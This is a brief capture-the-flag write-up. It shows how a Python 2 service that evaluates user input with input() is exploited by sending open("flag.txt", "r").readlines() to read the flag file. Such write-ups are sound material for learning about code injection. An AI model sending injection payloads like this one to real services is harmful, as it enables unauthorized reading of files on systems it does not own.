## Y2K

For this challenge we're given a tcp to connect when we connect we're presented with a prompt looking for input. 

My first thought was to try and overflow a buffer? 

```
nc challenge.ctf.games 31754
What year do YOU think the world will end?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Traceback (most recent call last):
  File "/home/challenge/server.py", line 4, in <module>
    end = input()
  File "<string>", line 1, in <module>
NameError: name 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' is not defined
```

But what's this...
That looks like a python error and more so it looks like it's trying to execute our input. 

Ok, let's see if we can read a file off the file systems

```
$ /c/Program\ Files\ \(x86\)/Nmap/ncat challenge.ctf.games 31754
What year do YOU think the world will end?
open("flag.txt", "r").readlines()
Yeah! I agree with you! I also think the world will end in the year
['flag{we_are_saved_from_py2_k}']
```

Bingo!